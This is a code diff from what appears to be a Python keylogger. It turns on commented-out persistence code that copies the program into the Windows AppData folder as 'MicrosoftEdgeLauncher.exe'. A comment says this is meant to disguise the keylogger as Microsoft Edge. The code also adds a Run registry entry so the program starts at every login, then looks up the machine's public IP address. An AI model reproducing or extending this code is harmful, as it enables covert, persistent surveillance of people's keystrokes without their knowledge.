@@ -138,12 +138,12 @@ def setup():
 
     # setup persistence 
 
-    # os_type = platform.system()
-    # if os_type == "Windows":
-    #     location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
-    #     if not os.path.exists(location):
-    #         shutil.copyfile(executable, location)
-    #         subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)
+    os_type = platform.system()
+    if os_type == "Windows":
+        location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
+        if not os.path.exists(location):
+            shutil.copyfile(executable, location)
+            subprocess.call(rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)
 
     try: 
         data = str(urlopen('http://checkip.dyndns.com/').read())
